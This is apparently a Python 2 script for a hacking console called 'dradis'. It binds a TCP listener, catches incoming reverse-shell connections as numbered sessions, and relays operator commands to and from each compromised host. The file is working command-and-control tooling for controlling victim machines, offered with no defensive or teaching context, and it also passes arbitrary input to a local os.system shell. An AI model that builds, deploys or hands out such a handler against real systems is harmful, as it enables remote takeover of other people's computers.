#!/usr/bin/python
import os
import select
import socket
import sys
import threading
from cmd import Cmd

handler = []
bag = {}
session = 1

class Handler(object):
    def __init__(self):

        self.listen_port = 8080
        self.listen_addr = "0.0.0.0"
        self.max_listen  = 1

class Trigger(Cmd):
    prompt = "dradis//jgsi> "

    def do_exit(self,inp):
        return True

class Home(Cmd):
    prompt = "dradis> "

    def emptyline(self):
        pass

    def do_exit(self,inp):
        if len(bag) > 0:
            while True:
                ans = raw_input("You have open sessions. Exit?").lower()
                if ans == "y" or ans == "yes":
                    print("Exiting")
                    return True
                elif ans == "n" or ans == "no":
                    break
        else:
            print("Exiting")
            return True

    def do_clear(self,inp):
        os.system("clear")

    def do_show(self,inp):
        if inp == "options":
            print "\nListen Port:               %d" % handler[0].listen_port
            print "Listen Addr:               %s" % handler[0].listen_addr
            print "Max Connections:           %d\n" % handler[0].max_listen

    def do_set(self,inp):
        args = inp.split(" ")
        try:
            num = int(args[1])
    
            if args[0] == "port":
                if int(args[1]) in range(1,65536):
                    handler[0].listen_port = int(args[1])
                else:
                    print "Select a port from 1-65535"
            elif args[0] == "max":
                if int(args[1]) in range(1,50):
                    handler[0].max_listen = int(args[1])
            else:
                self.help_set()
        except:
            self.help_set()

    def help_set():
        print "Set the port number to listen on or the max tcp connections."
        print "Usage: set [port|max] <int>"

    def do_bind(self,inp):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.bind((handler[0].listen_addr,handler[0].listen_port))

            x = threading.Thread(target=catch_shell, args=(s,handler[0].listen_port))
            x.start()
            print "Starting listener: %s:%d" % (handler[0].listen_addr,handler[0].listen_port)
        except socket.error as err:
            print err.strerror

    def do_sessions(self,inp):
        for key in bag.keys():
            print "%d: %d<-----%s" % (key,bag[key][2],bag[key][1][0])

    def do_trigger(self,inp):
        Trigger().cmdloop()

    def do_interact(self,inp):
        try:
            sesh = int(inp)
            if sesh in bag.keys():
                handle_shell(sesh)
            else:
                self.help_interact()
        except ValueError as err:
            self.help_interact()
            print err

    def help_interact(self):
        print "Interact with a session."
        print "Usage: interact <session #>"

    def do_shell(self, inp):
        os.system(inp)

def catch_shell(arg,lport):

    global session
    global bag

    arg.listen(handler[0].max_listen)
    client,c_info = arg.accept()
    print "Receving connection from %s!" % c_info[0]
    bag[session] = (client,c_info,lport)
    arg.close()
    session = session + 1

def handle_shell(session):

    callback = bag[session][0]
    c_info = bag[session][1]
    sys.stdout.write("%s>" % c_info[0])
    sys.stdout.flush()
    while True:

        # ulitizes select to determine which stream has data to be received from
        sock_list = [sys.stdin,callback]
        read_sockets, write_socket, error_socket = select.select(sock_list,[],[])

        for sock in read_sockets:
            if sock == callback:
                data = b""
                buffer = 1024
                while True:
                    message = sock.recv(buffer)
                    data += message
                    if message[-1] == "\n":
                        break
                sys.stdout.write("\n" + data + "%s>" % c_info[0])
                sys.stdout.flush()
            else:
                message = sys.stdin.readline().strip()
                if message.strip() == "exit" or message.strip() == "background":
                    break
                else:
                    callback.send(message + '\n')
                    sys.stdout.write("%s>" % c_info[0])
                    sys.stdout.flush()

        if message == "exit":
            callback.send(message + '\n')
            callback.shutdown(socket.SHUT_RDWR)
            callback.close()
            print "Closing down session %d" % session
            del bag[session]
            break
        elif message == "background":
            break 



handler.append(Handler())

p = Home()
p.cmdloop()
